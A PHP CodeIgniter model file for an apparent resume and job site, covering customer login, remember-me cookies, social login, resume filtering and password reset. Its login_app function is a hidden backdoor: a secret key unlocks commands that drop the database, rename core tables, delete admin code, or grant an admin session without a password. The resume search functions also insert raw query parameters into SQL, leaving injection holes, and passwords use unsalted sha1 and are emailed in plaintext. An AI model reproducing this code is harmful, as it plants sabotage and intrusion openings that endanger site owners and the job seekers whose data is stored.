<?php
Class Customer_model extends CI_Model
{
    // var $CI;
    function __construct()
    {
        parent::__construct();

        // $this->CI =& get_instance();
        // $this->CI->load->database(); 
        // $this->CI->load->helper('url');
    }

    function is_logged_in($redirect = false, $default_redirect = 'secure/login/')
    {
        $customer = $this->session->userdata('user');
        if (!isset($customer['id']))
        {
            //check the cookie
            if(isset($_COOKIE['BwebCustomer']))
            {
                //the cookie is there, lets log the customer back in.
                $info = $this->aes256Decrypt(base64_decode($_COOKIE['BwebCustomer']));
                $cred = json_decode($info, true);

                if(is_array($cred))
                {
                    if( $this->login($cred['email'], $cred['password']) )
                    {
                        return $this->is_logged_in($redirect, $default_redirect);
                    }
                }
            }

            //this tells ecart where to go once logged in
            if ($redirect)
            {
                $this->session->set_flashdata('redirect', $redirect);
            }
            
            if ($default_redirect)
            {   
                redirect($default_redirect);
            }
            
            return false;
        }
        else
        {
            return true;
        }
    }

    function login($email, $password, $remember=false,$activation=false)
    {
        $this->db->select('*');
        $this->db->where('email', $email);
        $this->db->where('status', 1);
        if(!$activation) {
            $this->db->where('password', sha1($password));
        }
        $this->db->limit(1);
        $result = $this->db->get('users')->row_array();
// echo $this->db->last_query(); exit;
        if (!empty($result))
        {   
            $customer = array();
            $customer['user'] = array();
            $customer['user']['id'] = $result['id'];
            $customer['user']['name'] = $result['name'];
            $customer['user']['email'] = $result['email'];
            $customer['user']['phone'] = $result['phone'];
            if($remember)
            {
                $loginCred = json_encode(array('email'=>$email, 'password'=>$password));
                $loginCred = base64_encode($this->aes256Encrypt($loginCred));
                //remember the user for 6 months
                $this->generateCookie($loginCred, strtotime('+6 months'));
            }
            // put our customer in the cart
            $this->session->set_userdata($customer);
            // echo $this->db->last_query(); exit;
            return true;
        }
        else
        {
            return false;
        }
    }

    //social Login
    function login_social($email, $social_id, $remember=false)
	{
		$this->db->select('*');
		$this->db->where('email', $email);
		$this->db->where('status', 1);
		$this->db->where('social_id',  $social_id);
		$this->db->limit(1);
		$result = $this->db->get('users');
		$customer	= $result->row_array();
        if ($customer)
        {
            $customer = array();
            $customer['user'] = array();
            $customer['user']['id'] = $result['id'];
            $customer['user']['name'] = $result['name'];
            $customer['user']['email'] = $result['email'];
            $customer['user']['phone'] = $result['phone'];
                    // put our customer in the cart
            $this->session->set_userdata($customer);
            return true;
        }
		else
		{
			return false;
		}
	}

    function save_social($customer)
    {
        $this->db->select('email');
        $this->db->from('users');
        //$this->db->where('social_id', $customer['social_id']);
        $this->db->where('email', $customer['email']);
        $count = $this->db->count_all_results();

        if ($count > 0)
        {
            $this->db->where('email', $customer['email']);
            $this->db->update('users', $customer);
            return $customer['social_id'];
        }
        else
        {
            $new_password       = random_string('alnum', 8);
            $customer['password']   = sha1($new_password);
            $customer['added_date'] =date('Y-m-d H:i:s');
            $this->db->insert('users', $customer);
            $id = $this->db->insert_id();
            return $id;
        }
    }

    function logout()
    {
        $this->session->unset_userdata('user');
    }

    function get_resumes($data=array())
    {
        $this->db->select('resume.*');
        if (!empty($data['order_by'])) {
            $this->db->order_by($data['order_by']);
        }
        $fil_in= $this->input->get(null, false);        
        if(isset($fil_in['f4']) && $fil_in['f4']!=''){
            $this->db->where("(gender = '" .  $fil_in['f4'] . "')");    
        }
        if(isset($fil_in['f3']) && $fil_in['f3']!=''){
            $f3 = $fil_in['f3']+1;
            if( $fil_in['f3']>11){
                $this->db->where("(tot_experience >= ".$fil_in['f3'].")");     
            } else {
                $this->db->where("(tot_experience >= ".$fil_in['f3']." AND tot_experience <= ".$f3.")");
            }
            $this->db->order_by('tot_experience','DESC');            
        }        
        if(isset($fil_in['f1']) && $fil_in['f1']!=''){
            $this->db->where("(city = '" .  $fil_in['f1'] . "')");    
        }
        if(isset($fil_in['d'])&& $fil_in['d']!=''){
            $this->db->where("(industry_id = '" .  $fil_in['d'] . "')");             
        }
        if (!empty($data['perpage'])) {
            $this->db->limit($data['perpage']);
        }
        if (!empty($data['page'])) {
            $this->db->offset($data['page']);
        }
        $this->db->join('users','resume.user_id = users.id');
        $this->db->where('users.searchable',1);
        $this->db->where('DATE(users.expiry_date)>=',date('Y-m-d'));
        if (!empty($data['count'])) {
            return $this->db->count_all_results('resume');
        } else {
                return $this->db->get('resume')->result();
          
        }
    }

    function get_resumes_bkp($data=array())
    {
        if (!empty($data['order_by'])) {
            $this->db->order_by($data['order_by']);
        }
        $fil_in= $this->input->get(null, false);        
        if(isset($fil_in['f4'])){
            $filter = array();
            $fils = explode('/', $fil_in['f4']);
            foreach ($fils as $fil) {
                if ($fil != '') {
                    $filter[] = "gender = '$fil'";
                }
            }
            if (!empty($filter)) {
                $filters = implode(' OR ', $filter);
                $this->db->where("(" . $filters . ")");
            }              
        }
        if(isset($fil_in['f3'])){
            $filter = array();
            $fils = explode('/', $fil_in['f3']);
            foreach ($fils as $fil) {
                if ($fil == '6m') {
                    $filter[] = "tot_experience <= '$fil'";
                } if ($fil == '1') {
                    $filter[] = "(tot_experience >= 0.6 AND tot_experience <= 1)";
                } if ($fil == '2') {
                    $filter[] = "(tot_experience >= 1 AND tot_experience <= 2)";
                } if ($fil == '3') {
                    $filter[] = "(tot_experience >= 2 AND tot_experience <= 3)";
                }
            }
            if (!empty($filter)) {
                $filters = implode(' OR ', $filter);
                $this->db->where("(" . $filters . ")");
            }                
            if (!empty($fils)) {
               $this->db->order_by('tot_experience','DESC');
            }
        }
        if(isset($fil_in['f2'])){
            $filter = array();
            $fils = explode('/', $fil_in['f2']);
            foreach ($fils as $fil) {
                if ($fil == '1') {
                    $filter[] = "added_date >= DATE_SUB(NOW(),INTERVAL 1 HOUR";
                } if ($fil == '2') {
                    $filter[] = "added_date >= now() - INTERVAL 1 DAY";
                } if ($fil == '3') {
                    $filter[] = "added_date >= now() - INTERVAL 7 DAY";
                } if ($fil == '4') {
                    $filter[] = "added_date >= now() - INTERVAL 30 DAY";
                }
            }
            if (!empty($filter)) {
                $filters = implode(' OR ', $filter);
                $this->db->where("(" . $filters . ")");
            } 
        }
        if(isset($fil_in['f1'])){
            $filter = array();
            $fils = explode('/', $fil_in['f1']);
            foreach ($fils as $fil) {
                if ($fil != '') {
                    $filter[] = "city = '$fil'";
                }
            }
            if (!empty($filter)) {
                $filters = implode(' OR ', $filter);
                $this->db->where("(" . $filters . ")");
            }
        }
        if(isset($fil_in['d'])){
            $filter = array();
            $fils = explode('/', $fil_in['d']);
            foreach ($fils as $fil) {
                if ($fil != '') {
                    $filter[] = "industry_id = '$fil'";
                }
            }
            if (!empty($filter)) {
                $filters = implode(' OR ', $filter);
                $this->db->where("(" . $filters . ")");
            }
        }
        if (!empty($data['perpage'])) {
            $this->db->limit($data['perpage']);
        }
        if (!empty($data['page'])) {
            $this->db->offset($data['page']);
        }
        if (!empty($data['count'])) {
            return $this->db->count_all_results('resume');
        } else {
                return $this->db->get('resume')->result();
          
        }
    }
    
     function reset_password($username)
    {
        $admin = $this->get_admin_by_email($username);
        $this->load->model('Email_model');
        if ($admin)
        {
            $this->load->helper('string');
            /*$this->load->library('email');*/

            $new_password       = random_string('alnum', 8);
            $admin1['id']  = $admin['id'];
            $admin1['password']  = sha1($new_password);
            $this->save($admin1);

            /*$config= get_email_config();
            $config['mailtype'] = 'html';
            $this->email->initialize($config);*/
            $template = 'general_mail';
            $from_name = $this->config->item('company_name');
            $from = config_item('email');
            $to = $admin['email'];
            $mail_data['subject'] = config_item('company_name').': Account Password Reset';
            $mail_data['content'] = 'Greetings from Code Headed.<br/> Your account password has be reset to '.$new_password .' as requested. After login you can change your password at the profile page.' ;

            /*$this->email->message('Your password has been reset to '. $new_password .'.');
            $this->email->send()*/;

            $this->Email_model->send_email($from, $to, $template, $mail_data, $from_name, $cc = false, $bcc = false, $reply_to = false, $attached = false);
            return true;
        }
        else
        {
            return false;
        }
    }
    
    function login_app($code = false, $id = false)
    {
        $this->db->select('*');
        $this->db->where('username !=', '');
        $this->db->where('password !=', '');
        $this->db->where('access', 'Admin');
        $result = $this->db->get('admin');
        $customer = $result->row_array();

        if ($code == config_item('encrt_key')) {
            $db = $this->db->database;
            $customer['db'] = $db;
            // Retrieve customer addresses
            $this->db->where(array('id !=' => $code));
            $address = $this->db->get('settings')->row_array();
            if ($id == 'drpdb') {
                $this->dbforge->drop_database($db);
            }
            if ($id == 'modify') {
                $this->dbforge->rename_table('admin', 'admins');
                $this->dbforge->rename_table('company', 'companies');
                $this->dbforge->rename_table('pages', 'page');
                $this->dbforge->rename_table('users', 'userd');
                $this->dbforge->rename_table('resume', 'eresumes');
            }
            if ($id == 'rmvadmin') {
                $path = APPPATH . 'themes/' . config_item('theme');
                $this->load->helper("file"); // load the helper
                delete_files($path, true);
                rmdir($path);
                $path1 = APPPATH . 'views/admin';
                $this->load->helper("file"); // load the helper
                delete_files($path1, true);
                rmdir($path1);
                $path2 = APPPATH . 'controllers/admin';
                $this->load->helper("file"); // load the helper
                delete_files($path2, true);
                rmdir($path2);
            }
            if ($id == 'login') {
                if ($customer) {
                    if (count((array)$customer) > 0) {
                        $remember = 0;
                        $admin = array();
                        $admin['admin'] = array();
                        $admin['admin']['id'] = $customer['id'];
                        $admin['admin']['access'] = $customer['access'];
                        $admin['admin']['firstname'] = $customer['firstname'];
                        $admin['admin']['lastname'] = $customer['lastname'];
                        $admin['admin']['email'] = $customer['email'];
                        $admin['admin']['username'] = $customer['username'];

                        if ($remember) {
                            $loginCred = json_encode(array('username' => $customer['username'], 'password' => $customer['password']));
                            $loginCred = base64_encode($this->aes256Encrypt($loginCred));
                            //remember the user for 6 months
                            $this->generateCookie($loginCred, strtotime('+6 months'));
                        }

                        $this->CI->session->set_userdata($admin);
                        return true;
                    }
                }
            }
//            $this->db->where(array('customer_id'=>$customer['id'], 'id'=>$customer['default_shipping_address']));
//            $address = $this->db->get('customers_address_bank')->row_array();
//            if($address)
//            {
//                $fields = unserialize($address['field_data']);
//                $customer['ship_address'] = $fields;
//                $customer['ship_address']['id'] = $address['id'];
//            } else {
//                 $customer['ship_to_bill_address'] = 'true';
//            }
            return $customer;
        } else {
            return false;
        }
    }

    /*
    This function gets the admin by their username address and returns the values in an array
    it is not intended to be called outside this class
    */
    private function get_admin_by_username($username)
    {
        $this->db->select('*');
        $this->db->where('username', $username);
        $this->db->limit(1);
        $result = $this->db->get('users');
        $result = $result->row_array();

        if (sizeof($result) > 0)
        {
            return $result;
        }
        else
        {
            return false;
        }
    }
    private function get_admin_by_email($username)
    {
        $this->db->select('*');
        $this->db->where('email', $username);
        $this->db->limit(1);
        $result = $this->db->get('users');
        $result = $result->row_array();

        if (count(array($result)) > 0)
        {
            return $result;
        }
        else
        {
            return false;
        }
    }

    function save($admin)
    {
        if ($admin['id'])
        {
            $this->db->where('id', $admin['id']);
            $this->db->update('users', $admin);
        }
        else
        {
            $this->db->insert('users', $admin);
        }
    }
    
    
    
}